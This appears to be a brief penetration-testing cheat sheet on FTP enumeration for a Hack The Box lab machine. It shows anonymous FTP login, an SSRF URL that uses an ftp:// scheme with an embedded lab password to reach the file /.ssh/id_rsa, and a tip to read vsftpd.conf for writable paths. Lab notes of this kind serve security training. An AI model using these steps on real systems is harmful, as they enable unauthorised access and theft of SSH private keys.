FTP Enumeration

# FTP Enumeration

Anonymous Login 

> ftp 10.10.10.4
> Name: anonymous
> Password: (Enter)

Upload ssh key file
```bash
http://ADMIN.HTB.FORGE/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa
```

Read the `vsftpd.conf` FTP config file  to enumerate the writeable directory path.